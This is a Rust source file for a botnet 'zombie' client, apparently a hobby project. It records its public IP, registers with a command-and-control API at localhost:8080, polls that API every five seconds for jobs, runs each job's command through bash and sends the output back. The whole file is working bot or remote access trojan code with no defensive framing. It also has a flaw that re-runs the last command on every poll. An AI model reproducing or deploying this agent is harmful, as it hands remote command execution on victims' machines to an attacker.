use reqwest::Client;
use std::collections::HashSet;
use std::error::Error;
use tokio::process::Command;
use tokio::time::sleep;
use tokio::time::timeout;
use tokio::time::Duration;
use uuid::Uuid;

#[derive(serde::Deserialize, Debug, serde::Serialize)]
struct Zombie {
    id: Uuid,
    query: String,
}

#[derive(serde::Deserialize, Debug, serde::Serialize)]
struct Job {
    job_id: Uuid,
    zombie_id: Uuid,
    cmd: String,
}
#[derive(Debug, Clone, serde::Deserialize, serde::Serialize)]
pub struct JobResult {
    pub job_id: Uuid,
    pub output: String,
}

type Result<T> = std::result::Result<T, Box<dyn Error>>;

const API_URL: &str = "http://localhost:8080/api";
const IP_API_URL: &str = "https://api.ipify.org";

async fn exec_cmd(cmd: String) -> Result<String> {
    let output = Command::new("/bin/bash")
        .arg("-c")
        .arg(cmd)
        .output()
        .await?;

    let stdout = String::from_utf8(output.stdout)?;

    Ok(stdout)
}

async fn get_ip(client: &Client) -> Result<String> {
    let response = client.get(IP_API_URL).send().await?;
    let ip = response.text().await?;
    Ok(ip)
}

async fn create_zombie(client: &Client, ip: String) -> Result<Uuid> {
    let response = client
        .post(format!("{API_URL}/zombies"))
        .json(&serde_json::json!({ "ip": ip }))
        .send()
        .await?;

    let zombie = response.json::<Uuid>().await?;

    Ok(zombie)
}

async fn create_job_result(
    client: &Client,
    zombie_id: Uuid,
    job_id: Uuid,
    output: String,
) -> Result<()> {
    let _response = client
        .post(format!(
            "{API_URL}/zombies/{zombie_id}/jobs/{job_id}/result"
        ))
        .json(&serde_json::json!({ "output": output }))
        .send()
        .await?;

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let client = Client::new();
    let ip = get_ip(&client).await?;
    let zombie_id = create_zombie(&client, ip).await?;

    let mut processed_jobs: HashSet<Uuid> = HashSet::new();

    loop {
        sleep(Duration::from_secs(5)).await;

        let req_get_jobs = client
            .get(format!(
                "http://localhost:8080/api/zombies/{zombie_id}/jobs"
            ))
            .send()
            .await?;

        let jobs_response: Vec<Job> =
            match timeout(Duration::from_secs(60), req_get_jobs.json()).await {
                Ok(jobs) => jobs?,

                Err(_) => continue,
            };

        if let Some(last_job) = jobs_response.last() {
            let cmd = &last_job.cmd;
            let output = exec_cmd(cmd.clone()).await?;
            let job_id = last_job.job_id;

            if processed_jobs.contains(&job_id) {
                continue;
            }

            processed_jobs.insert(job_id);
            create_job_result(&client, zombie_id, job_id, output).await?;
        }
    }
}
